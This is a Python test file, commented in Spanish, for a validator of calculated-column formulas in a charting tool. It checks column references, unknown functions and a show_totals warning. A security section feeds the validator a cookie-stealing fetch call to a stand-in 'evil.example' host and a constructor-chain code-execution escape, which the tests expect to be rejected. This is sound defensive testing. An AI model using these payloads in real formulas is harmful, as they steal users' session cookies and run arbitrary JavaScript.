# Licensed to the Apache Software Foundation (ASF) under one
# or more contributor license agreements.  See the NOTICE file
# distributed with this work for additional information
# regarding copyright ownership.  The ASF licenses this file
# to you under the Apache License, Version 2.0 (the
# "License"); you may not use this file except in compliance
# with the License.  You may obtain a copy of the License at
#
#   http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing,
# software distributed under the License is distributed on an
# "AS IS" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
# KIND, either express or implied.  See the License for the
# specific language governing permissions and limitations
# under the License.
"""Pruebas del núcleo puro de irex.validate_calculated_column_formula —
los patrones de extracción están portados literalmente de
`calculatedColumns.ts`; estas pruebas verifican que el puerto se comporta
igual sobre los mismos casos reales (referencias simples, con alcance,
funciones conocidas/desconocidas, símbolos desbalanceados)."""

from irex.irex_mcp_tools.explore_calculated_column_core import (
    KNOWN_FUNCTION_ALIASES,
    extract_calculated_column_references,
    extract_unknown_function_tokens,
    formula_validation_result,
    known_calculated_column_names,
    uses_total_scope,
)


class TestExtractCalculatedColumnReferences:
    def test_referencia_simple(self):
        assert extract_calculated_column_references("{{Venta}} - {{Costo}}") == ["Venta", "Costo"]

    def test_referencia_con_espacios_internos_se_recorta(self):
        assert extract_calculated_column_references("{{  Venta  }}") == ["Venta"]

    def test_scope_con_llaves(self):
        assert extract_calculated_column_references("{{Venta}} / total.{{Venta}}") == ["Venta", "Venta"]

    def test_scope_sin_llaves(self):
        assert extract_calculated_column_references("total.Venta + col.Costo") == ["Venta", "Costo"]

    def test_no_confunde_scope_con_llaves_con_scope_sin_llaves(self):
        # "total.{{Venta}}" no debe además matchear SCOPED_BARE ni el {{...}} suelto.
        assert extract_calculated_column_references("total.{{Venta}}") == ["Venta"]

    def test_sin_referencias(self):
        assert extract_calculated_column_references("1 + 1") == []


class TestExtractUnknownFunctionTokens:
    def test_funcion_conocida_no_se_marca(self):
        assert extract_unknown_function_tokens("IF({{X}} = 0, 0, {{Y}})") == []

    def test_funcion_desconocida_se_marca(self):
        assert extract_unknown_function_tokens("SUME({{X}})") == ["SUME"]

    def test_literales_true_false_null_nan_no_se_marcan(self):
        assert extract_unknown_function_tokens("IF({{X}}, TRUE, FALSE)") == []
        assert extract_unknown_function_tokens("{{X}} = NULL") == []
        assert extract_unknown_function_tokens("ROUND({{X}}) = NAN") == []

    def test_nombre_de_columna_en_mayusculas_dentro_de_llaves_no_se_marca(self):
        # Un nombre real de columna en mayúsculas (ej. "TOTAL_SALES") va DENTRO de
        # {{}} — nunca se lo confunde con un token de función.
        assert extract_unknown_function_tokens("{{TOTAL_SALES}} * 2") == []

    def test_varios_tokens_desconocidos_sin_duplicar(self):
        assert extract_unknown_function_tokens("SUME({{X}}) + SUME({{Y}}) + COUNTX({{Z}})") == ["SUME", "COUNTX"]

    def test_todas_las_funciones_conocidas_estan_en_el_set(self):
        for name in ("IF", "OR", "AND", "NOT", "ISBLANK", "ABS", "ROUND", "MAX", "MIN"):
            assert name in KNOWN_FUNCTION_ALIASES


class TestExtractUnknownFunctionTokensSecurity:
    """Hallazgo de seguridad 2026-09-29: antes de este cambio, el chequeo
    solo miraba identificadores ALL-CAPS y dejaba pasar CUALQUIER otro
    (fetch, document, window, eval, constructor, total suelto sin punto)
    sin marcarlos -- exactamente lo que el compilador real tampoco filtraba,
    permitiendo ejecución de JS arbitrario vía new Function(). Ver
    calculatedColumns.ts::findDisallowedIdentifier para la corrección
    equivalente del lado del compilador (la barrera real)."""

    def test_fetch_y_document_en_minuscula_se_marcan(self):
        result = extract_unknown_function_tokens(
            "(1, fetch('https://evil.example/steal?c=' + document.cookie))"
        )
        assert "fetch" in result
        assert "document" in result

    def test_window_suelto_se_marca(self):
        assert "window" in extract_unknown_function_tokens("window.location")

    def test_eval_suelto_se_marca(self):
        assert "eval" in extract_unknown_function_tokens("eval('1')")

    def test_total_suelto_sin_punto_se_marca(self):
        # total.{{Venta}}/total.Venta son el uso legítimo (scope) y NO se
        # marcan -- pero un "total" bare (sin punto) es la forma de llegar
        # al parámetro real de la función compilada y encadenar
        # .constructor.constructor(...) -- debe marcarse igual que fetch.
        assert "total" in extract_unknown_function_tokens("total.constructor.constructor('1')()")

    def test_identificador_dentro_de_string_literal_no_se_marca(self):
        # "hello"/"world" son contenido de un string, no código -- no deben
        # aparecer como identificadores no reconocidos.
        assert extract_unknown_function_tokens("IF({{X}} = 'hello world', 1, 0)") == []

    def test_formula_legitima_real_sigue_sin_marcar_nada(self):
        assert (
            extract_unknown_function_tokens(
                "IF(OR(ISBLANK(total.{{Sell In}}), total.{{Sell In}} = 0), 0, "
                "{{Sell In}} / total.{{Sell In}})"
            )
            == []
        )


class TestFormulaValidationResultSecurity:
    def test_payload_de_exfiltracion_es_invalido(self):
        result = formula_validation_result(
            "(1, fetch('https://evil.example/steal?c=' + document.cookie))",
            ["Venta"],
        )
        assert result["valid"] is False
        assert "fetch" in result["unknown_functions"]
        assert "document" in result["unknown_functions"]

    def test_prototype_chain_escape_via_total_es_invalido(self):
        result = formula_validation_result(
            "total.constructor.constructor('return 1')()",
            ["Venta"],
        )
        assert result["valid"] is False
        assert "total" in result["unknown_functions"]


class TestKnownCalculatedColumnNames:
    def test_columnas_agrupadas_simples(self):
        assert known_calculated_column_names({"groupby": ["causa_nombre", "region"]}) == ["causa_nombre", "region"]

    def test_columnas_agrupadas_adhoc_con_label(self):
        form_data = {"groupby": [{"label": "Mes", "sqlExpression": "..."}]}
        assert known_calculated_column_names(form_data) == ["Mes"]

    def test_metricas_string_y_adhoc(self):
        form_data = {"metrics": ["count", {"label": "Venta", "expressionType": "SQL"}]}
        assert known_calculated_column_names(form_data) == ["count", "Venta"]

    def test_calculated_columns_existentes_tambien_cuentan(self):
        form_data = {"calculated_columns": [{"label": "Margen", "expression": "{{Venta}} - {{Costo}}"}]}
        assert known_calculated_column_names(form_data) == ["Margen"]

    def test_combinado_en_orden(self):
        form_data = {
            "groupby": ["causa_nombre"],
            "metrics": [{"label": "Venta"}, {"label": "Costo"}],
            "calculated_columns": [{"label": "Margen"}],
        }
        assert known_calculated_column_names(form_data) == ["causa_nombre", "Venta", "Costo", "Margen"]

    def test_sin_ninguno_devuelve_vacio(self):
        assert known_calculated_column_names({}) == []


class TestFormulaValidationResult:
    def test_formula_valida_referencia_existente(self):
        result = formula_validation_result("{{Venta}} - {{Costo}}", ["Venta", "Costo"])
        assert result == {"valid": True, "resolved_references": ["Venta", "Costo"], "warnings": []}

    def test_coincide_sin_distinguir_mayusculas_y_devuelve_el_nombre_real(self):
        result = formula_validation_result("{{venta}}", ["Venta"])
        assert result["valid"] is True
        assert result["resolved_references"] == ["Venta"]

    def test_referencia_repetida_no_se_duplica_en_resolved(self):
        result = formula_validation_result("{{Venta}} + {{Venta}}", ["Venta"])
        assert result["resolved_references"] == ["Venta"]

    def test_referencia_desconocida_invalida_con_detalle(self):
        result = formula_validation_result("{{Costoo}}", ["Venta", "Costo"])
        assert result["valid"] is False
        assert result["unknown_references"] == ["Costoo"]
        assert "Costoo" in result["error"]

    def test_funcion_desconocida_invalida_con_detalle(self):
        result = formula_validation_result("SUME({{Venta}})", ["Venta"])
        assert result["valid"] is False
        assert result["unknown_functions"] == ["SUME"]

    def test_ambos_problemas_a_la_vez(self):
        result = formula_validation_result("SUME({{Costoo}})", ["Venta"])
        assert result["valid"] is False
        assert result["unknown_references"] == ["Costoo"]
        assert result["unknown_functions"] == ["SUME"]

    def test_expresion_vacia(self):
        result = formula_validation_result("   ", [])
        assert result == {"valid": False, "error": "La expresión está vacía."}

    def test_llaves_desbalanceadas(self):
        result = formula_validation_result("{{Venta} - {{Costo}}", ["Venta", "Costo"])
        assert result["valid"] is False
        assert "llaves" in result["error"]

    def test_parentesis_desbalanceados(self):
        result = formula_validation_result("IF({{Venta}} = 0, 0, {{Venta}}", ["Venta"])
        assert result["valid"] is False
        assert "paréntesis" in result["error"]

    def test_formula_con_scope_y_funcion_conocida(self):
        result = formula_validation_result(
            "IF({{Venta}} = 0, 0, {{Venta}}/total.{{Venta}})",
            ["Venta"],
        )
        assert result["valid"] is True

    def test_caso_real_del_docstring(self):
        result = formula_validation_result("IF({{Cuota}} = 0, 0, {{Venta}}/{{Cuota}})", ["Venta", "Cuota"])
        assert result["valid"] is True
        assert set(result["resolved_references"]) == {"Venta", "Cuota"}


class TestUsesTotalScope:
    def test_detecta_total_con_llaves(self):
        assert uses_total_scope("total.{{Venta}}") is True

    def test_detecta_total_sin_llaves(self):
        assert uses_total_scope("total.Venta") is True

    def test_no_confunde_col_o_row_con_total(self):
        assert uses_total_scope("col.{{Venta}} + row.{{Costo}}") is False

    def test_sin_alcance_alguno(self):
        assert uses_total_scope("{{Venta}} - {{Costo}}") is False


class TestShowTotalsWarning:
    """Caso real encontrado en vivo (2026-09-28, sesión
    explore-57def401...): el modelo propuso
    IF(OR(ISBLANK(total.{{Sell In}}), total.{{Sell In}} = 0), 0, {{Sell In}} / total.{{Sell In}})
    como `calculated_columns` — `irex.validate_calculated_column_formula`
    la dio por válida (la estructura y las referencias SÍ eran correctas),
    pero el gráfico no tenía `show_totals` activo. Leyendo
    `TableChart.tsx`/`transformProps.ts` del plugin real: sin
    `show_totals`, `totals` queda `undefined` y `enrichedTotal` (el
    contexto que resuelve `total.{{...}}`) queda `null` — la fórmula
    entera colapsa siempre a la rama 0, nunca calcula el porcentaje real.
    Esto no lo puede atrapar una revisión de estructura/referencias sola,
    por eso es un `warning` aparte, no parte del check de `valid`."""

    def test_total_sin_show_totals_activo_agrega_warning_pero_sigue_valid(self):
        # El caso real reportado: la fórmula ES estructuralmente válida —
        # el problema es una dependencia de OTRO control, no la fórmula.
        result = formula_validation_result(
            "IF(OR(ISBLANK(total.{{Sell In}}), total.{{Sell In}} = 0), 0, {{Sell In}} / total.{{Sell In}})",
            ["Sell In"],
            show_totals_enabled=False,
        )
        assert result["valid"] is True
        assert len(result["warnings"]) == 1
        assert "show_totals" in result["warnings"][0]
        assert "total.{{...}}" in result["warnings"][0]

    def test_total_con_show_totals_activo_no_agrega_warning(self):
        result = formula_validation_result(
            "{{Venta}} / total.{{Venta}}",
            ["Venta"],
            show_totals_enabled=True,
        )
        assert result["warnings"] == []

    def test_sin_alcance_total_no_agrega_warning_aunque_show_totals_este_apagado(self):
        result = formula_validation_result("{{Venta}} - {{Costo}}", ["Venta", "Costo"], show_totals_enabled=False)
        assert result["warnings"] == []

    def test_el_warning_tambien_aparece_si_la_formula_es_invalida_por_otra_razon(self):
        # Una referencia rota Y una dependencia de show_totals a la vez —
        # ambos problemas deben quedar visibles, no solo el primero.
        result = formula_validation_result(
            "total.{{ColumnaQueNoExiste}}",
            ["Venta"],
            show_totals_enabled=False,
        )
        assert result["valid"] is False
        assert len(result["warnings"]) == 1

    def test_default_show_totals_enabled_es_true_no_rompe_llamadas_viejas(self):
        # Cualquier código que llame formula_validation_result sin pasar
        # show_totals_enabled (como antes de este cambio) no debe empezar
        # a recibir warnings de golpe.
        result = formula_validation_result("total.{{Venta}}", ["Venta"])
        assert result["warnings"] == []
